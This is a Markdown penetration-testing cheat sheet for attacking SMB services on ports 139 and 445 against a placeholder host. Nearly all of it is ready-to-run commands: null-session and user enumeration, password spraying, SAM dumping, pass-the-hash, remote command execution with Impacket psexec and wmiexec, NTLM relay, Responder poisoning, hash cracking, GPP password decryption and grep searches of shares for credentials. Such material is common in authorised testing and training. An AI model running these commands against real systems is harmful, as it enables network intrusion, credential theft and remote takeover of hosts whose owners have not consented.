# SMB Enumeration (Ports 139, 445)

Enumerate SMB shares, users, and configurations to identify sensitive files and potential attack vectors.
SMB is critical in Windows environments and often contains credentials, configuration files, and paths to privilege escalation.

## Quick Reference

```bash
# Check for null session
smbclient -N -L //10.10.10.10

# List shares with credentials
smbclient -L //10.10.10.10 -U username

# Enumerate with NetExec
nxc smb 10.10.10.10 -u '' -p '' --shares

# Spider all shares
nxc smb 10.10.10.10 -u username -p password -M spider_plus
```

## SMB Ports

- **Port 139**: SMB over NetBIOS
- **Port 445**: SMB directly over TCP/IP
- **UDP 137-138**: NetBIOS Name Service

## Null Session Enumeration

```bash
# SMBClient null session
smbclient -N -L //10.10.10.10

# NetExec null session
nxc smb 10.10.10.10 -u '' -p '' --shares
nxc smb 10.10.10.10 -u 'guest' -p '' --shares

# Enum4linux
enum4linux -a 10.10.10.10

# RPCClient null session
rpcclient -U "" -N 10.10.10.10
```

## NetExec  Enumeration

```bash
# Basic enumeration
nxc smb 10.10.10.10

# List shares
nxc smb 10.10.10.10 -u username -p password --shares

# Enumerate users
nxc smb 10.10.10.10 -u username -p password --users

# Enumerate groups
nxc smb 10.10.10.10 -u username -p password --groups

# Enumerate logged-on users
nxc smb 10.10.10.10 -u username -p password --loggedon-users

# Enumerate local groups
nxc smb 10.10.10.10 -u username -p password --local-groups

# Check for admin access
nxc smb 10.10.10.10 -u username -p password

# Spider shares
nxc smb 10.10.10.10 -u username -p password -M spider_plus --share 'ShareName'

# Get file from share
nxc smb 10.10.10.10 -u username -p password --get-file '\\Windows\\Temp\\file.txt' ./file.txt

# Execute command
nxc smb 10.10.10.10 -u username -p password -x 'whoami'

# Dump SAM
nxc smb 10.10.10.10 -u username -p password --sam

# Pass-the-hash
nxc smb 10.10.10.10 -u username -H NTHASH
```

## SMBClient

```bash
# List shares
smbclient -L //10.10.10.10 -U username

# Connect to share
smbclient //10.10.10.10/ShareName -U username

# Connect with null session
smbclient //10.10.10.10/IPC$ -N

# Download file
smbclient //10.10.10.10/Share -U username -c 'get file.txt'

# Upload file
smbclient //10.10.10.10/Share -U username -c 'put file.txt'

# Recursive listing
smbclient //10.10.10.10/Share -U username -c 'recurse;ls'
```

## SMBMap

```bash
# List shares
smbmap -H 10.10.10.10

# With credentials
smbmap -u username -p password -H 10.10.10.10

# Recursive listing
smbmap -u username -p password -H 10.10.10.10 -R ShareName

# Download file
smbmap -u username -p password -H 10.10.10.10 --download 'ShareName\file.txt'

# Upload file
smbmap -u username -p password -H 10.10.10.10 --upload 'file.txt' 'ShareName\file.txt'

# Execute command
smbmap -u username -p password -H 10.10.10.10 -x 'ipconfig'
```

## Nmap NSE Scripts

```bash
# SMB enumeration
nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 10.10.10.10

# SMB vulnerabilities
nmap -p 445 --script smb-vuln* 10.10.10.10

# Specific vulnerabilities
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10  # EternalBlue
nmap -p 445 --script smb-vuln-ms08-067 10.10.10.10

# SMB security mode
nmap -p 445 --script smb-security-mode 10.10.10.10

# SMB2 capabilities
nmap -p 445 --script smb2-capabilities,smb2-security-mode 10.10.10.10
```

## Password Spraying

```bash
# Domain-joined hosts
nxc smb 10.10.10.10 -u users.txt -p 'Password123!' -d domain.local --continue-on-success

# Local authentication
nxc smb 10.10.10.10 -u users.txt -p 'Password123!' --local-auth --continue-on-success

# Subnet spray
nxc smb 10.10.10.0/24 -u administrator -p 'Password123!'
```

## Mounting SMB Shares

### Linux

```bash
# Create mount point
sudo mkdir /mnt/smb_share

# Mount with credentials
sudo mount -t cifs -o username=user,password=pass //10.10.10.10/Share /mnt/smb_share

# Mount with credential file
sudo mount -t cifs -o credentials=/path/to/creds //10.10.10.10/Share /mnt/smb_share

# Credential file format:
# username=user
# password=pass
# domain=.

# Unmount
sudo umount /mnt/smb_share
```

### Windows

```cmd
# Map network drive
net use Z: \\10.10.10.10\Share

# With credentials
net use Z: \\10.10.10.10\Share /user:username password

# View mapped drives
net use

# Disconnect
net use Z: /delete
```

```powershell
# PowerShell mount
New-PSDrive -Name "Z" -Root "\\10.10.10.10\Share" -PSProvider "FileSystem"

# With credentials
$username = 'username'
$password = 'password'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "Z" -Root "\\10.10.10.10\Share" -PSProvider "FileSystem" -Credential $cred
```

## Searching for Sensitive Files

### Linux

```bash
# Search for files containing "password"
grep -rn /mnt/smb_share/ -ie "password"

# Search for specific filenames
find /mnt/smb_share/ -name "*cred*"
find /mnt/smb_share/ -name "*.config"
find /mnt/smb_share/ -name "*.xml"
```

### Windows

```cmd
# Search for files containing keywords
findstr /s /i /n /c:"password" /c:"credential" Z:\* > results.txt

# PowerShell search
Get-ChildItem -Recurse -Path Z:\ -Include *cred* -File
Get-ChildItem -Recurse -Path Z:\ | Select-String "password" -List
```

## Remote Command Execution

```bash
# Impacket psexec
impacket-psexec username:password@10.10.10.10

# Impacket smbexec
impacket-smbexec username:password@10.10.10.10

# Impacket wmiexec
impacket-wmiexec username:password@10.10.10.10

# NetExec
nxc smb 10.10.10.10 -u username -p password -x 'whoami'
nxc smb 10.10.10.10 -u username -p password --exec-method smbexec -x 'whoami'
```

## NTLM Relay Attack

```bash
# Disable SMB in Responder
cat /etc/responder/Responder.conf | grep 'SMB ='
# Set: SMB = Off

# Start ntlmrelayx
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10

# With command execution
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10 -c 'whoami'

# Dump SAM
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10
```

## Responder (LLMNR/NBT-NS Poisoning)

```bash
# Start Responder
sudo responder -I eth0

# Analyze mode (no poisoning)
sudo responder -I eth0 -A

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## Common Workflow

```bash
# Step 1: Check for null session
smbclient -N -L //10.10.10.10

# Step 2: Enumerate shares
nxc smb 10.10.10.10 -u '' -p '' --shares

# Step 3: If credentials available, spider shares
nxc smb 10.10.10.10 -u username -p password -M spider_plus

# Step 4: Mount interesting shares
sudo mount -t cifs -o username=user,password=pass //10.10.10.10/Share /mnt/smb

# Step 5: Search for sensitive files
grep -rn /mnt/smb/ -ie "password"
find /mnt/smb/ -name "*cred*"

# Step 6: Check for vulnerabilities
nmap -p 445 --script smb-vuln* 10.10.10.10
```

## Notes

**SMB Versions:**
- SMB1: Legacy, vulnerable (MS17-010/EternalBlue)
- SMB2: Windows Vista/Server 2008+
- SMB3: Windows 8/Server 2012+, encrypted

**Common Shares:**
- `C$`: Administrative share (C: drive)
- `ADMIN$`: Windows installation directory
- `IPC$`: Inter-Process Communication (null session)
- `SYSVOL`: Domain Group Policy (Domain Controllers)
- `NETLOGON`: Logon scripts (Domain Controllers)

**Null Session:**
Allows anonymous connection to IPC$ share. Can enumerate:
- Users and groups
- Shares
- Domain information
- Password policies

**SMB Signing:**
- **Enabled**: Prevents NTLM relay attacks
- **Disabled**: Vulnerable to NTLM relay
- Check with: `nmap -p 445 --script smb-security-mode 10.10.10.10`

**Critical Vulnerabilities:**
- **MS17-010 (EternalBlue)**: RCE on SMB1
- **MS08-067**: RCE on Windows XP/2003
- **SMBGhost (CVE-2020-0796)**: RCE on SMBv3
- **ZeroLogon (CVE-2020-1472)**: Domain takeover

**Sensitive Files to Look For:**
- `web.config`: Database credentials
- `*.xml`: Configuration files
- `*.ini`: Application settings
- `*.config`: Various credentials
- `Groups.xml`: GPP passwords (SYSVOL)
- `*.kdbx`: KeePass databases
- `*.rdp`: RDP connection files
- `*.txt`: Notes, passwords
- `*.sql`: Database dumps

**Spider Plus Module:**
NetExec's spider_plus module output: `/tmp/cme_spider_plus/`
```bash
# View results
cat /tmp/cme_spider_plus/*.json | jq .
```

**GPP Passwords:**
Group Policy Preferences can contain encrypted passwords in SYSVOL:
```bash
# Find Groups.xml
find /mnt/sysvol -name "Groups.xml"

# Decrypt with gpp-decrypt
gpp-decrypt <encrypted_password>
```

**Pass-the-Hash:**
```bash
# NetExec
nxc smb 10.10.10.10 -u username -H NTHASH

# Impacket
impacket-psexec -hashes :NTHASH username@10.10.10.10
```

**SMB Relay Requirements:**
- SMB signing disabled on target
- Valid credentials captured
- User has admin rights on target

**Best Practices:**
- Always check for null sessions first
- Enumerate users before password spraying
- Look for SYSVOL/NETLOGON on Domain Controllers
- Check for SMB signing status
- Test for EternalBlue on older systems
- Search for GPP passwords
- Look for backup files and database dumps
- Check file timestamps for recent activity
